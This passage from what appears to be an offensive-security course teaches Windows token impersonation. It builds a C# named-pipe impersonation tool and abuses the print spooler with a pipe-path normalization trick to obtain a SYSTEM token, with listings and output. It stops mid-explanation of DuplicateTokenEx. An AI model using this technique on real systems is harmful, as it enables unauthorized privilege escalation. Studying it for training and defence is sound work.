In addition, an _impersonation token_[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-9) can be created that allows a user to act on behalf of another user without that user's credentials. Impersonation tokens have four levels: _Anonymous_, _Identification_, _Impersonation_, and _Delegation_.[10](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-10) Anonymous and Identification only allow enumeration of information.

Impersonation, as the name implies, allows impersonation of the client's identity, while Delegation[11](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5352-11) makes it possible to perform sequential access control checks across multiple machines. The latter is critical to the functionality of distributed applications.

For example, let's assume a user authenticates to a web server and performs an action on that server that requires a database lookup. The web service could use delegation to pass authentication to the database server "through" the web server.

Now that we've discussed the main theory behind Windows post-authentication permissions and access rights, we'll practically apply this theory in the next section.

#### Exercise

1. Use cmd.exe and the whoami command to view the privileges for both a regular user command prompt as well as an elevated command prompt.

1

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-1)

2

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-2)

3

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-3)

4

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-4)

5

(Microsoft, 2017), [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-5)

6

(Microsoft, 2018), [https://docs.microsoft.com/en-gb/windows/win32/api/ntsecapi/nf-ntsecapi-lsaaddaccountrights](https://docs.microsoft.com/en-gb/windows/win32/api/ntsecapi/nf-ntsecapi-lsaaddaccountrights) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-6)

7

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/how-to-configure-security-policy-settings](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/how-to-configure-security-policy-settings) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-7)

8

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-8)

9

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-tokens) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-9)

10

(James Forshaw, 2015), [https://www.slideshare.net/Shakacon/social-engineering-the-windows-kernel-by-james-forshaw](https://www.slideshare.net/Shakacon/social-engineering-the-windows-kernel-by-james-forshaw) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-10)

11

(Microsoft, 2018), [https://docs.microsoft.com/en-us/windows/win32/com/delegation-and-impersonation](https://docs.microsoft.com/en-us/windows/win32/com/delegation-and-impersonation) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_5352-11)

### 15.2.2. Elevation with Impersonation

In the previous section, we discussed how the privileges of an access token decide the access rights of an authenticated user. Now let's discuss how we can leverage certain privileges for escalation.

In the past, security researchers have identified[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-1) nine different privileges that may allow for privilege escalation from medium integrity to either high integrity or system integrity, or enable compromise of processes running as another authenticated user.

Explaining all nine privileges in-depth and how they may be used to escalate privileges is beyond the scope of this module, but we'll focus on _SeImpersonatePrivilege_.

_SeImpersonatePrivilege_ allows us to impersonate any token for which we can get a reference, or _handle_.[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-2) This privilege is quite interesting since the built-in _Network Service_ account, the _LocalService_[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-3) account, and the default IIS account have it assigned by default. Because of this, gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access.

If we have the _SeImpersonatePrivilege_ privilege we can often use the Win32 _DuplicateTokenEx_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-4) API to create a primary token from an impersonation token and create a new process in the context of the impersonated user.

When no tokens related to other user accounts are available in memory, we can likely force the SYSTEM account to give us a token that we can impersonate.

To leverage the _SeImpersonatePrivilege_ privilege, in this section we are going to use a post exploitation attack[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-5) that relies on Windows _pipes_.[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-6)

Pipes are a means of _interprocess communication_ (IPC),[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-7) just like RPC, COM, or even network sockets.

A pipe is a section of shared memory inside the kernel that processes can use for communication. One process can create a pipe (the pipe server) while other processes can connect to the pipe (pipe clients) and read/write information from/to it, depending on the configured access rights for a given pipe.

_Anonymous_[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-8) pipes are typically used for communication between parent and child processes, while _named_[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-9) pipes are more broadly used. In our examples we'll make use of named pipes, because they have more functionality and more importantly, they support impersonation.

The attack that we are going to simulate (based on a technique developed by the security researcher Lee Christensen[10](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-10)) can force the SYSTEM account to connect to a named pipe set up by an attacker.

While the technique was originally developed as part of an Active Directory attack, it can also be used locally. It is based on the print spooler service,[11](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-11) which is started by default and runs in a SYSTEM context.

We'll discuss the technique in more detail later. For now, it's important to understand that the attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the _SeImpersonatePrivilege_ privilege that simulates a print client, we will obtain a SYSTEM token that we can impersonate.

To demonstrate this, let's create a C# application that creates a pipe server (i.e. a "print client"), waits for a connection, and attempts to impersonate the client that connects to it.

The first key component of this attack is the _ImpersonateNamedPipeClient_[12](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-12) API, which allows impersonation of the token from the account that connects to the pipe if the server has _SeImpersonatePrivilege_. When _ImpersonateNamedPipeClient_ is called, the calling thread will use the impersonated token instead of its default token.

In order to create our first proof of concept, we'll have to use the Win32 _CreateNamedPipe_,[13](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-13) _ConnectNamedPipe_,[14](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-14) and _ImpersonateNamedPipeClient_ APIs.

As the name suggests, _CreateNamedPipe_ creates a pipe. Its function prototype is shown in Listing 17.

```
HANDLE CreateNamedPipeA(
  LPCSTR                lpName,
  DWORD                 dwOpenMode,
  DWORD                 dwPipeMode,
  DWORD                 nMaxInstances,
  DWORD                 nOutBufferSize,
  DWORD                 nInBufferSize,
  DWORD                 nDefaultTimeOut,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes
);
```

> Listing 17 - CreateNamedPipe function prototype

This API accepts a number of relatively simple arguments. The first, and most important, is the pipe name (_lpName_). All named pipes must have a standardized name format (such as \\.\pipe\pipename) and must be unique on the system.

The second argument (_dwOpenMode_) describes the mode the pipe is opened in. We'll specify a bi-directional pipe with the _PIPE_ACCESS_DUPLEX_ enum using its numerical equivalent of "3". The third argument (_dwPipeMode_) describes the mode the pipe operates in. We'll specify _PIPE_TYPE_BYTE_ to directly write and read bytes along with _PIPE_WAIT_ to enable blocking mode. This will allow us to listen on the pipe until it receives a connection. We'll specify the combination of these two modes with the numerical value "0".

The maximum number of instances for the pipe is specified through _nMaxInstances_. This is primarily used to ensure efficiency in larger applications, and any value between 1 and 255 works for us. _nOutBufferSize_ and _nInBufferSize_ define the number of bytes to use for the input and output buffer. We'll choose one memory page (0x1000 bytes).

The second-to-last argument defines the default time-out value that is used with the _WaitNamedPipe_[15](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-15) API. Since we are using a blocking named pipe, we don't care about this and can choose the default value of 0. For the last argument, we must submit a SID detailing which clients can interact with the pipe. We'll set this to NULL to allow the SYSTEM and local administrators to access it.

At this point, we will create a new Visual Studio solution and insert the P/Invoke DllImport statement along with the call to _CreateNamedPipe_:

```
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
        }
    }
}
```

> Listing 18 - Code to import and call CreateNamedPipe

This code expects the pipe name to be passed on the command line.

Next, we must invoke _ConnectNamedPipe_. The function prototype is shown in Listing 19.

```
BOOL ConnectNamedPipe(
  HANDLE       hNamedPipe,
  LPOVERLAPPED lpOverlapped
);
```

> Listing 19 - ConnectNamedPipe function prototype

The first argument (_hNamedPipe_) is a handle to the pipe that is returned by _CreateNamedPipe_ and the second (_lpOverlapped_) is a pointer to a structure used in more advanced cases. In our case, we'll simply set this to NULL.

The code addition required to import and call _ConnectNamedPipe_ is shown in Listing 20.

```
[DllImport("kernel32.dll")]
static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
...
ConnectNamedPipe(hPipe, IntPtr.Zero);
```

> Listing 20 - Code to import and call ConnectNamedPipe

After we have called _ConnectNamedPipe_, the application will wait for any incoming pipe client. Once a connection is made, we'll call _ImpersonateNamedPipeClient_ to impersonate the client.

_ImpersonateNamedPipeClient_ accepts the pipe handle as its only argument per its function prototype as shown in Listing 21.

```
BOOL ImpersonateNamedPipeClient(
  HANDLE hNamedPipe
);
```

> Listing 21 - ImpersonateNamedPipeClient function prototype

The rather simple code additions importing and calling _ImpersonateNamedPipeClient_ are shown in Listing 22.

```
[DllImport("Advapi32.dll")]
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
...
ImpersonateNamedPipeClient(hPipe);
```

> Listing 22 - Code to import and call ImpersonateNamedPipeClient

At this point, our code will start a pipe server, listen for incoming connections, and impersonate them.

If everything works correctly, _ImpersonateNamedPipeClient_ will assign the impersonated token to the current thread, but we have no way of confirming this in our current application.

To verify the success of our attack, we can open the impersonated token with _OpenThreadToken_[16](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-16) and then use _GetTokenInformation_[17](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-17) to obtain the SID associated with the token. Finally, we can call _ConvertSidToStringSid_[18](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-18) to convert the SID to a readable SID string.

While this confirmation does not have to be part of our final exploit, it helps us understand the attack. Let's add these APIs to our code.

The function prototype for _OpenThreadToken_ is shown in Listing 23.

```
BOOL OpenThreadToken(
  HANDLE  ThreadHandle,
  DWORD   DesiredAccess,
  BOOL    OpenAsSelf,
  PHANDLE TokenHandle
);
```

> Listing 23 - OpenThreadToken function prototype

First we must supply a handle to the thread (_ThreadHandle_) associated with this token. Since the thread in question is the current thread, we'll use the Win32 _GetCurrentThread_[19](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-19) API, which does not require any arguments and simply returns the handle.

Next we must specify the level of access (_DesiredAccess_) we want to the token. To avoid any issues, we'll ask for all permissions (_TOKEN_ALL_ACCESS_[20](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-20)) with its numerical value of 0xF01FF.

_OpenAsSelf_ specifies whether the API should use the security context of the process or the thread. Since we want to use the impersonated token, we'll set this to false.

Finally, we must supply a pointer (_TokenHandle_), which will be populated with a handle to the token that is opened. Code additions are shown in Listing 24.

```
[DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentThread();

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
...
IntPtr hToken;
OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
```

> Listing 24 - Code additions to call OpenThreadToken

Next, we'll invoke _GetTokenInformation_. This API can return a variety of information, but we'll simply request the SID. The function prototype is shown in Listing 25.

```
BOOL GetTokenInformation(
  HANDLE                  TokenHandle,
  TOKEN_INFORMATION_CLASS TokenInformationClass,
  LPVOID                  TokenInformation,
  DWORD                   TokenInformationLength,
  PDWORD                  ReturnLength
);
```

> Listing 25 - GetTokenInformation function prototype

The first argument (_TokenHandle_) is the token we obtained from _OpenThreadToken_, and the second argument (_TokenInformationClass_) specifies the type of information we want to obtain.

_TOKEN_INFORMATION_CLASS_[21](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-21) is an enum that contains values specifying the type of information we can retrieve from an access token via _GetTokenInformation_. Since we simply want the SID, we can pass _TokenUser_, which has the numerical value of "1", for the _TOKEN_INFORMATION_CLASS_ argument.

_TokenInformation_ is a pointer to the output buffer that will be populated by the API and _TokenInformationLength_ is the size of the output buffer. Since we don't know the required size of the buffer, the recommended way of using the API is to call it twice. The first time, we set these two arguments values to NULL and 0 respectively and then _ReturnLength_ will be populated with the required size.

After this, we can allocate an appropriate buffer and call the API a second time. The require code updates are shown in Listing 26.

```
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
...
int TokenInfLength = 0;
GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
```

> Listing 26 - Code additions to call GetTokenInformation

To allocate the TokenInformation buffer, we'll use the .NET _Marshal.AllocHGlobal_[22](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-22) method, which can allocate unmanaged memory.

As the final step, we'll use _ConvertSidToStringSid_ to convert the binary SID to a SID string that we can read. The function prototype of _ConvertSidToStringSid_ is shown in Listing 27.

```
BOOL ConvertSidToStringSidW(
  PSID   Sid,
  LPWSTR *StringSid
);
```

> Listing 27 - ConvertSidToStringSid function prototype

The first argument (_Sid_) is a pointer to the SID. The SID is in the output buffer that was populated by _GetTokenInformation_, but we must extract it first.

One way to do this is to define the _TOKEN_USER_[23](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-23) structure (which is part of the _TOKEN_INFORMATION_CLASS_ used by _GetTokenInformation_) and then marshal a pointer to it with _Marshal.PtrToStructure_.[24](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-24)

For the last argument (_*StringSid_), we'll supply the output string. Here we can simply supply an empty pointer and once it gets populated, marshal it to a C# string with _Marshal.PtrToStringAuto_.[25](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-25)

The required structures, import, and added code are shown in Listing 28.

```
 [StructLayout(LayoutKind.Sequential)]
public struct SID_AND_ATTRIBUTES
{
    public IntPtr Sid;
    public int Attributes;
}

public struct TOKEN_USER
{
    public SID_AND_ATTRIBUTES User;
}
...
[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
...
TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
IntPtr pstr = IntPtr.Zero;
Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
string sidstr = Marshal.PtrToStringAuto(pstr);
Console.WriteLine(@"Found sid {0}", sidstr);
```

> Listing 28 - Code additions to call ConvertSidToStringSid

At the end of Listing 28, we print the SID associated with the token to the console, showing which user we impersonated.

Now we have finally written all the code we need to start our test and better understand the use of named pipes for impersonation and privilege escalation.

As previously mentioned, we must execute the code in the context of a user account that has the _SeImpersonatePrivilege_ access right. For our attack demonstration, we'll log in to appsrv01 as the domain user _admin_ and use PsExec to open a command prompt as the built-in _Network Service_ account as shown in Listing 29.

```
C:\Tools\SysInternalsSuite> psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
```

> Listing 29 - Opening a command prompt as Network Service

Before we execute our application, we can verify the user and the presence of _SeImpersonatePrivilege_ in the new command prompt:

```
C:\Tools> whoami
nt authority\network service

C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> Listing 30 - User and privileges

Now we can compile our assembled code and transfer it to appsrv01.

Next, we execute it and supply a random pipe name as shown in Listing 31.

```
C:\Tools>PrintSpooferNet.exe \\.\pipe\test
```

> Listing 31 - Starting the pipe server

To simulate a connection, we can open an elevated command prompt and write to the pipe as shown in Listing 32.

```
C:\Users\Administrator> echo hello > \\localhost\pipe\test
```

> Listing 32 - Writing to the pipe

When we switch back to the command prompt running our application, we find that a SID has been printed:

```
C:\Tools> PrintSpooferNet.exe \\.\pipe\test
Found sid S-1-5-21-1587569303-1110564223-1586047116-500
```

> Listing 33 - SID of built in administrator

Our code has impersonated a token and resolved the associated SID.

To verify that this SID belongs to the administrator account, we can switch back to the elevated command prompt and dump it as shown in Listing 34.

```
C:\Users\Administrator> whoami /user

USER INFORMATION
----------------

User Name           SID
=================== =============================================
corp1\administrator S-1-5-21-1587569303-1110564223-1586047116-500
```

> Listing 34 - Dumping SID with whoami

This proves that we have indeed impersonated the built-in domain administrator account. More importantly, we can impersonate anyone who connects to our named pipe.

It's now time to test our application leveraging the print spooler service. Communication to the spooler service is done through _Print System Remote Protocol_ (MS-RPRN),[26](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-26) which dates back to 2007 and is not well documented. Fortunately for us, the MS-RPRN works through named pipes and the pipe name used by the print spooler service is \pipe\spoolss.

The potential for abuse comes from the _RpcOpenPrinter_[27](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-27) and _RpcRemoteFindFirstPrinterChangeNotification_[28](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-28) functions. _RpcOpenPrinter_ allows us to retrieve a handle for the printer server, which is used as an argument to the second API.

_RpcRemoteFindFirstPrinterChangeNotification_ essentially monitors printer object changes and sends change notifications to print clients.

Once again, this change notification requires the print spooler to access the print client. If we ensure that the print client is our named pipe, it will obtain a SYSTEM token that we can impersonate.

Sadly, unlike regular Win32 APIs, MS-RPRN APIs can not be called directly. Print spooler functionality resides in the unmanaged RpcRT4.dll library and is called through the proxy function _NdrClientCall2_,[29](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-29) which uses a binary format to pass and invoke underlying functions. The implementation of these calls are beyond the scope of this module.

Luckily, we can use the _SpoolSample_ C# implementation written by Lee Christensen[30](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-30) or the PowerShell code written by Vincent Le Toux.[31](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-31) A compiled version of SpoolSample is located in the C:\Tools folder of appsrv01.

The SpoolSample application and the entire printer bug technique was developed to be used in an Active Directory setting and was not specifically designed for local privilege escalation.

When we use SpoolSample, we must specify the name of the server to connect to (the victim) and the name of the server we control (the attacker), also called the capture server. Since we are performing the attack locally, both servers are the same. This presents a challenge.

The print spooler service (running as SYSTEM on the victim) needs to contact the simulated print client (through our pipe) but since they are on the same host, they in effect require the same default pipe name (pipe\spoolss). Because of this, we cannot create the named pipe with the required name easily.

In order to find a solution, we first must understand the problem in detail. To do this, we will monitor the target system with Process Monitor from SysInternals while executing SpoolSample.exe against an arbitrary pipe name.Process Monitor is located in the C:\Tools\SysInternals folder.

First, we'll configure a capture filter with _Filter_ > _Filter_ and select _Process Name_ from the dropdown menu, setting this to "spoolsv.exe" to filter for print spooler events. We'll then click _Add_ followed by _Apply_ and exit the filter menu by selecting _OK_.

Then, we'll execute SpoolSample.exe and specify the current hostname followed by an arbitrary pipe name as shown in Listing 35.

```
C:\Tools> SpoolSample.exe appsrv01 appsrv01\test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\appsrv01, CaptureServer: \\appsrv01\test
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```

> Listing 35 - Invoking SpoolSample with arbitrary pipe name

Although the application output indicates that a printer notification callback was configured, Process Monitor shows that no access to the arbitrary pipe name has occurred as displayed in Figure 2.

![[OffSec/OSEP/Course/z. images/e5082ca068c60c299967c349761deaab_MD5.jpg]]

Figure 2: No connections from spoolss

This is because, before attempting to access the client pipe, the print spooler service validates the pipe path, making sure it matches the default name "pipe\spoolss". Our arbitrary pipe "test" fails this validation and, consequently, the print spooler service doesn't even attempt to connect to the client. This is why we don't see any successful nor failed attempt in Process Monitor. Unfortunately, as mentioned before, we cannot specify "spoolss" as a name since it is already in use by the print spooler service we are targeting.

At this point, it is useful to know what happens when a file path is supplied to a Win32 API. When directory separators are used as a part of the file path, they are converted to canonical form. Specifically, forward slashes ("/") will be converted to backward slashes ("\"). This is also known as file path normalization.[32](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-32)

Interestingly enough, the security researcher @jonaslyk discovered that if we provide SpoolSample with an arbitrary pipe name containing a forward slash after the hostname ("appsrv01/test"), the spooler service will not interpret it correctly and it will append the default name "pipe\spoolss" to our own path before processing it. This effectively bypasses the path validation and the resulting path ("appsrv01/test\pipe\spoolss") is then normalized before the spooler service attempts to send a print object change notification message to the client.

This obviously can help us because this pipe name differs from the default one used by the print spooler service, and we can register it in order to simulate a print client.

To verify this, we can repeat our last example but this time supplying an arbitrary pipe name that contains a forward slash in the print client name:

```
C:\Tools> SpoolSample.exe appsrv01 appsrv01/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\appsrv01, CaptureServer: \\appsrv01/test
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
```

> Listing 36 - Invoking SpoolSample with forward slash

We receive an error and Process Monitor confirms the theory (Figure 3).

![[OffSec/OSEP/Course/z. images/324f59207828aa1e8163e1114f0ddac9_MD5.jpg]]

Figure 3: Path canonicalized and attempted access

First, the path we supplied (appsrv01/test) has been switched to a canonical form (appsrv01\test) as part of the full path.

Second, spoolsv.exe attempted to access the named pipe \\.\appsrv01\test\pipe\spoolss while performing the callback. Since we have not created a pipe server by that name yet, the request failed.

At this point, we just need to create a pipe server with that name and simulate a print client. When we execute SpoolSample, the print spooler service will connect to our pipe.

To do this, we'll open another command prompt and launch our PrintSpooferNet application. Recall that we are launching our application from a _Network Service_ command prompt because we are demonstrating a scenario where we have exploited a process that has the _SeImpersonatePrivilege_, and we are trying to escalate to SYSTEM.

```
C:\Tools> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
```

> Listing 37 - Creating the pipe server

Now we'll invoke SpoolSample to trigger the change notification against the capture server (appsrv01/pipe/test) as shown in Listing 38.

```
C:\Tools> SpoolSample.exe appsrv01 appsrv01/pipe/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\appsrv01, CaptureServer: \\appsrv01/pipe/test
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

> Listing 38 - Invoking SpoolSample again the pipe server

Our application reveals a connection from the "S-1-5-18" SID :

```
C:\Tools>PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
Found sid S-1-5-18
```

> Listing 39 - Invoking SpoolSample with forward slash

This SID value belongs to the SYSTEM account[33](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-33) proving that our technique worked. Excellent!

We now have a way of forcing the SYSTEM account to authenticate to our named pipe, which allows us to impersonate it. To complete this attack, we must now take advantage of the impersonated token, which we will do by launching a new command prompt as SYSTEM.

The Win32 _CreateProcessWithTokenW_[34](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_5353-34) API can create a new process based on a token. The token must be a primary token, so we'll first use _DuplicateTokenEx_ to convert the impersonation token to a primary token.

The function prototype for _DuplicateTokenEx_ is shown in Listing 40.

```
BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,
  DWORD                        dwDesiredAccess,
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  TOKEN_TYPE                   TokenType,
  PHANDLE                      phNewToken
);
```

> Listing 40 - DuplicateTokenEx function prototype

First, we'll supply the impersonation token by recovering it with _OpenThreadToken_. We'll request full access to the token with the numerical value 0xF01FF for the _dwDesiredAccess_ argument. For the third argument (_lpTokenAttributes_), we'll use a default security descriptor for the new token by setting this to NULL.

